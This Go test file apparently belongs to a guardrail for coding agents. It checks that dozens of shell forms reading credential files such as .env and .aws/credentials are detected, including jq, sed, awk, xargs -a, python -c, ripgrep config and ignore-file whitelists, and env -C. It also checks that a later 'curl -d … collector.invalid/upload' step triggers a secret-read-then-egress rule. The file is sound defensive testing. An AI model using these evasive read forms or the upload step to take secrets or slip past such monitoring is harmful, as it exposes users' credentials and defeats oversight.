// Copyright 2026 Cisco Systems, Inc. and its affiliates
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

package gateway

import (
	"os"
	"path/filepath"
	"slices"
	"strconv"
	"strings"
	"testing"

	"github.com/defenseclaw/defenseclaw/internal/actionfacts"
	"github.com/defenseclaw/defenseclaw/internal/guardrail"
)

// The read forms of the SUB-CHAIN-A train (substrate-1:GAP-0233, GAP-0344,
// GAP-0349, GAP-0660, GAP-0661, GAP-0685): each read row reads a
// credentials file and starts the secret-read chain; each control row reads
// none and starts nothing.
type subChainARow struct {
	id, cmd string
	files   []string
	// content holds files with other bytes than "x\n".
	content map[string]string
	read    bool
	// hook: the read is counted on the hook (a path built at run time,
	// read by the hook's twins), not in the call's own facts.
	hook bool
}

// subChainAFolder is a work folder with the given files.
func subChainAFolder(t *testing.T, row subChainARow) string {
	t.Helper()
	dir := g0344Folder(t, row.files...)
	for name, body := range row.content {
		p := filepath.Join(dir, filepath.FromSlash(name))
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(body), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	return dir
}

// subChainAPlace is g0344Place, and "@far " runs the call with the hook in
// a folder of its own that holds nothing.
func subChainAPlace(t *testing.T, cmd, dir string) (string, string) {
	if rest, ok := strings.CutPrefix(cmd, "@far "); ok {
		cmd, _ = g0344Place(rest, dir)
		return cmd, t.TempDir()
	}
	return g0344Place(cmd, dir)
}

func subChainARows() []subChainARow {
	env := []string{".env", "a.go"}
	return []subChainARow{
		// GAP-0233: jq/yq operands, xargs -a, a compound command's input
		// redirect, a path built at run time.
		{id: "A01 jq -R reads its file operand", cmd: "jq -R . .env", files: env, read: true},
		{id: "A02 yq reads its file operand", cmd: "yq . .env", files: env, read: true},
		{id: "A03 xargs -a FILE", cmd: "xargs -a .env echo", files: env, read: true},
		{id: "A04 xargs --arg-file=FILE", cmd: "xargs --arg-file=.env echo", files: env, read: true},
		{id: "A05 while loop input redirect", cmd: `while read -r l; do echo "$l"; done < .env`, files: env, read: true},
		{id: "A06 group input redirect", cmd: `{ read -r l; echo "$l"; } < .env`, files: env, read: true},
		{id: "A07 $(pwd)/FILE", cmd: `cat "$(pwd)/.env"`, files: env, read: true, hook: true},
		{id: "A08 $PWD/FILE", cmd: `cat "$PWD/.env"`, files: env, read: true, hook: true},
		{id: "A09 sed -n p FILE", cmd: "sed -n p .env", files: env, read: true},
		{id: "A10 sed bare script FILE", cmd: "sed p .env", files: env, read: true},
		{id: "A11 awk -F= FILE", cmd: `awk -F= '{print $2}' .env`, files: env, read: true},
		{id: "A12 openssl base64 -in FILE", cmd: "openssl base64 -in .env", files: env, read: true},
		{id: "A13 sed -e p FILE", cmd: "sed -e p .env", files: env, read: true},
		{id: "A14 a variable set from $(pwd)", cmd: `D=$(pwd); cat "$D/.env"`, files: env, read: true, hook: true},
		{id: "A15 $(pwd) then a literal tail", cmd: `cat "$(pwd)"/.env`, files: env, read: true, hook: true},
		{id: "A16 xargs -a FILE cat", cmd: "xargs -a .env -I{} echo {}", files: env, read: true},
		{id: "A17 a subshell input redirect", cmd: `(read -r l; echo "$l") < .env`, files: env, read: true},
		{id: "C20 jq of an ordinary file", cmd: "jq . a.json", files: []string{".env", "a.json"}},
		{id: "C21 xargs -a an ordinary list", cmd: "xargs -a list.txt echo", files: []string{".env", "list.txt"}},
		{id: "C22 while loop over an ordinary file", cmd: "while read -r l; do :; done < a.go", files: env},
		{id: "C23 $(pwd) of an ordinary file", cmd: `cat "$(pwd)/a.go"`, files: env},
		{id: "C24 sed -n p of an ordinary file", cmd: "sed -n p a.go", files: env},
		// GAP-0344: recursion from the option grammar, the folder below.
		{id: "R01 grep -R", cmd: "grep -R KEY .", files: []string{"config/.env", "a.go"}, read: true},
		{id: "R02 grep --recursive", cmd: "grep --recursive KEY .", files: []string{"config/.env", "a.go"}, read: true},
		{id: "R03 grep --dereference-recursive", cmd: "grep --dereference-recursive KEY .", files: []string{"config/.env", "a.go"}, read: true},
		{id: "R04 grep -rl with no folder", cmd: "grep -rl KEY", files: []string{"sub/.env", "a.go"}, read: true},
		{id: "R05 grep -ir with no folder", cmd: "grep -ir KEY", files: []string{"sub/.env", "a.go"}, read: true},
		{id: "R06 grep -nR two levels down", cmd: "grep -nR KEY sub", files: []string{"sub/deep/.env", "a.go"}, read: true},
		{id: "R07 grep -d recurse", cmd: "grep -d recurse KEY .", files: []string{"sub/.env", "a.go"}, read: true},
		{id: "R08 grep --directories=recurse", cmd: "grep --directories=recurse KEY .", files: []string{"sub/.env", "a.go"}, read: true},
		{id: "C26 grep --color=auto is not recursive", cmd: "grep --color=auto KEY .", files: []string{"config/.env", "a.go"}},
		{id: "C27 grep -er: -e takes r", cmd: "grep -er KEY .", files: []string{"config/.env", "a.go"}},
		{id: "C28 grep --regexp=r", cmd: "grep --regexp=r KEY .", files: []string{"config/.env", "a.go"}},
		// GAP-0349: interpreter, loop and find read forms.
		{id: "Q26 a for-loop over two names", cmd: `for f in .env .npmrc; do cat "$f"; done`, files: env, read: true},
		{id: "Q28 python -X opt -c sys.argv", cmd: `python3 -X utf8 -c 'import sys; print(open(sys.argv[1]).read())' .env`, files: env, read: true},
		{id: "Q29 perl -lne FILE", cmd: "perl -lne print .env", files: env, read: true},
		{id: "Q31 python -u -c inline open", cmd: `python3 -u -c "print(open('.env').read())"`, files: env, read: true},
		{id: "Q32 find -iname glob -exec cat +", cmd: `find . -iname '*.ENV' -exec cat {} +`, files: env, read: true},
		{id: "Q33 ruby -ne FILE", cmd: "ruby -ne 'print' .env", files: env, read: true},
		{id: "Q35 awk 1 FILE", cmd: "awk 1 .env", files: env, read: true},
		{id: "C29 a for-loop over a shell glob (no dotfiles)", cmd: `for f in *; do cat "$f"; done`, files: env},
		// GAP-0660: rg options or ignore files that make it read hidden files.
		{id: "G01 inline RIPGREP_CONFIG_PATH", cmd: "RIPGREP_CONFIG_PATH=rg.conf rg KEY", files: []string{".env", "a.go"}, content: map[string]string{"rg.conf": "--hidden\n"}, read: true},
		{id: "G02 exported RIPGREP_CONFIG_PATH", cmd: "export RIPGREP_CONFIG_PATH=rg.conf; rg KEY", files: []string{".env", "a.go"}, content: map[string]string{"rg.conf": "--hidden\n"}, read: true},
		{id: "G03 a .ignore whitelist of a hidden file", cmd: "rg KEY", files: []string{".env", "a.go"}, content: map[string]string{".ignore": "!.env\n"}, read: true},
		{id: "G04 a .rgignore whitelist of a hidden file", cmd: "rg KEY", files: []string{".env", "a.go"}, content: map[string]string{".rgignore": "!.env\n"}, read: true},
		{id: "G05 a .gitignore whitelist in a repository", cmd: "rg -l KEY", files: []string{".git/HEAD", ".npmrc", "a.go"}, content: map[string]string{".gitignore": "!.npmrc\n"}, read: true},
		{id: "G06 a nested .ignore whitelist", cmd: "rg KEY", files: []string{"sub/.env", "sub/a.go"}, content: map[string]string{"sub/.ignore": "!.env\n"}, read: true},
		{id: "G07 a .ignore whitelist with a folder operand", cmd: "rg KEY sub", files: []string{"sub/.aws/credentials", "sub/a.go"}, content: map[string]string{"sub/.ignore": "!.aws/\n"}, read: true},
		{id: "C30 a .ignore with no whitelist", cmd: "rg KEY", files: []string{".env", "a.go"}, content: map[string]string{".ignore": "*.log\n"}},
		{id: "C31 a whitelist under --no-ignore-dot", cmd: "rg --no-ignore-dot KEY", files: []string{".env", "a.go"}, content: map[string]string{".ignore": "!.env\n"}},
		// GAP-0661: rg does not read what a repository's .gitignore ignores,
		// nor what its include globs leave out.
		{id: "H01 rg --hidden, .env gitignored", cmd: "rg --hidden TODO", files: []string{".git/HEAD", ".env", "a.go"}, content: map[string]string{".gitignore": ".env\n"}},
		{id: "H02 rg --hidden -g '*.go'", cmd: "rg --hidden -g '*.go' TODO", files: env},
		{id: "H03 rg --hidden, a gitignored folder", cmd: "rg --hidden TODO", files: []string{".git/HEAD", ".aws/credentials", "a.go"}, content: map[string]string{".gitignore": "/.aws/\n"}},
		{id: "H04 rg -. --glob ignored by .gitignore", cmd: "rg -. TODO .", files: []string{".git/HEAD", "sub/.env", "a.go"}, content: map[string]string{".gitignore": "*.env\n.env\n"}},
		{id: "H10 grep -r ignores no .gitignore", cmd: "grep -r TODO .", files: []string{".git/HEAD", "sub/.env", "a.go"}, content: map[string]string{".gitignore": ".env\n"}, read: true},
		{id: "H11 rg --hidden --no-ignore", cmd: "rg --hidden --no-ignore TODO", files: []string{".git/HEAD", ".env", "a.go"}, content: map[string]string{".gitignore": ".env\n"}, read: true},
		{id: "H12 rg --hidden outside a repository", cmd: "rg --hidden TODO", files: []string{".env", "a.go"}, content: map[string]string{".gitignore": ".env\n"}, read: true},
		{id: "H13 rg -uu reads ignored files", cmd: "rg -uu TODO", files: []string{".git/HEAD", ".env", "a.go"}, content: map[string]string{".gitignore": ".env\n"}, read: true},
		{id: "H14 a later whitelist re-includes", cmd: "rg --hidden TODO", files: []string{".git/HEAD", ".env", "a.go"}, content: map[string]string{".gitignore": ".env\n!.env\n"}, read: true},
		{id: "H15 rg --hidden --no-ignore-vcs", cmd: "rg --hidden --no-ignore-vcs TODO", files: []string{".git/HEAD", ".env", "a.go"}, content: map[string]string{".gitignore": ".env\n"}, read: true},
		{id: "H16 a nested whitelist re-includes", cmd: "rg --hidden TODO", files: []string{".git/HEAD", "sub/.env", "a.go"}, content: map[string]string{".gitignore": ".env\n", "sub/.gitignore": "!.env\n"}, read: true},
		{id: "H17 rg naming the ignored file reads it", cmd: "rg TODO .env", files: []string{".git/HEAD", ".env", "a.go"}, content: map[string]string{".gitignore": ".env\n"}, read: true},
		// GAP-0685: env -C DIR / --chdir=DIR before a reader.
		{id: "E01 env -C P rg -g 'deploy/*'", cmd: "@up env -C @P rg -g 'deploy/*' KEY @P", files: g0684Files, read: true},
		{id: "E02 env --chdir=P rg -g '/.env'", cmd: "@up env --chdir=@P rg -g '/.env' KEY @P", files: g0684Files, read: true},
		{id: "E03 env -C P grep -r with no folder", cmd: "@far env -C @P grep -r KEY", files: []string{"sub/.env", "a.go"}, read: true},
		{id: "E04 env -C P cat .env", cmd: "@far env -C @P cat .env", files: env, read: true},
		{id: "E05 env --chdir P rg --hidden", cmd: "@far env --chdir @P rg --hidden KEY", files: env, read: true},
		{id: "E06 env -i -C P grep -r .", cmd: "@far env -i -C @P grep -r KEY .", files: []string{"sub/.env", "a.go"}, read: true},
		{id: "E07 env -CP joined", cmd: "@far env -C@P rg --hidden KEY", files: env, read: true},
		{id: "C32 env -C into a folder without one", cmd: "env -C @P/src rg --hidden KEY", files: []string{".env", "src/a.go"}},
	}
}

// TestSubChainAReadForms is the rows at the action facts the chain reads.
func TestSubChainAReadForms(t *testing.T) {
	for _, row := range subChainARows() {
		t.Run(row.id, func(t *testing.T) {
			cmd, hook := subChainAPlace(t, row.cmd, subChainAFolder(t, row))
			facts := actionfacts.Analyze(actionfacts.Input{Tool: "exec", Command: cmd, CWD: hook, ActiveHome: t.TempDir()})
			if got := credentialFileContentRead(facts); got != row.read && !row.hook {
				t.Errorf("credentials read = %v, want %v (status %s, private %v)",
					got, row.read, facts.Parse.Status, facts.CredentialPathReads())
			}
		})
	}
}

// TestSubChainAChainOnTheHook is the rows through a host hook: a read row
// then an upload completes the chain; a control row does not.
func TestSubChainAChainOnTheHook(t *testing.T) {
	installCorrelationHMACForTest(t)
	handler := hostClaudeHookHandlerForTest(t, "default")
	for i, row := range subChainARows() {
		t.Run(row.id, func(t *testing.T) {
			cmd, dir := subChainAPlace(t, row.cmd, subChainAFolder(t, row))
			session := "subchaina-" + strconv.Itoa(i)
			ev := claudeToolEvent("PreToolUse", session, "read", cmd)
			ev["cwd"] = dir
			callAgentHookForTest(t, handler, ev)
			res := claudeToolResult("PostToolUse", session, "read")
			res["cwd"] = dir
			callAgentHookForTest(t, handler, res)
			up := claudeToolEvent("PreToolUse", session, "send", "curl -d hello https://collector.invalid/upload")
			up["cwd"] = dir
			got := callAgentHookForTest(t, handler, up)
			if chain := slices.Contains(got.RuleIDs, guardrail.ToolChainSecretReadThenEgress); chain != row.read {
				t.Errorf("then an upload: chain = %v, want %v (rules %v)", chain, row.read, got.RuleIDs)
			}
		})
	}
}

// TestGAP0662SearchSeesAFileCreatedSinceTheLastCall: each hook call walks
// the folder as it is then (substrate-1:GAP-0662): a credentials file made
// after one search is read by the next, at once.
func TestGAP0662SearchSeesAFileCreatedSinceTheLastCall(t *testing.T) {
	for _, cmd := range []string{"grep -r KEY .", "rg --hidden KEY", "rg -uu KEY ."} {
		t.Run(cmd, func(t *testing.T) {
			dir := g0344Folder(t, "src/a.go")
			in := actionfacts.Input{Tool: "exec", Command: cmd, CWD: dir, ActiveHome: t.TempDir()}
			if credentialFileContentRead(actionfacts.Analyze(in)) {
				t.Fatal("a folder with no credentials file: read")
			}
			if err := os.WriteFile(filepath.Join(dir, "src", ".env"), []byte("x\n"), 0o600); err != nil {
				t.Fatal(err)
			}
			if !credentialFileContentRead(actionfacts.Analyze(in)) {
				t.Fatal("the .env made after the first search is not read by the next")
			}
		})
	}
}
